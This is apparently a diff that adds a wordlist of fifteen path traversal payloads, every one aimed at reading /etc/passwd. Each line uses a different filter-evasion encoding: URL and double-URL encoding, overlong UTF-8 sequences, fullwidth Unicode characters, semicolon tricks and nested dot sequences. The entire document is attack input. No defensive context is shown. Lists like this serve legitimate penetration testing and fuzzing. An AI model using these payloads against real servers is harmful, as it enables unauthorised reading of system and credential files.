@@ -1,0 +1,15 @@
+../../../../../../etc/passwd
+..\..\..\..\..\..\etc\passwd
+..\/..\/..\/..\/..\/etc\/passwd
+%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
+%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af
+%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215etc%u2215passwd
+%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216etc%u2216passwd
+%u002e%u002e%u2215%u002e%u002e%u2215%u002e%u002e%u2215%u002e%u002e%u2215%u002e%u002e%u2215etc%u2215passwd
+%u002e%u002e%u2216%u002e%u002e%u2216%u002e%u002e%u2216%u002e%u002e%u2216%u002e%u002e%u2216etc%u2216passwd
+..;/..;/..;/..;/..;/etc;/passwd
+..;\..;\..;\..;\..;\etc;\passwd
+..././..././..././..././..././etc/passwd
+...\.\...\.\...\.\...\.\...\.\etc\passwd
+..%255c/..%255c/..%255c/..%255c/..%255c/etc/passwd
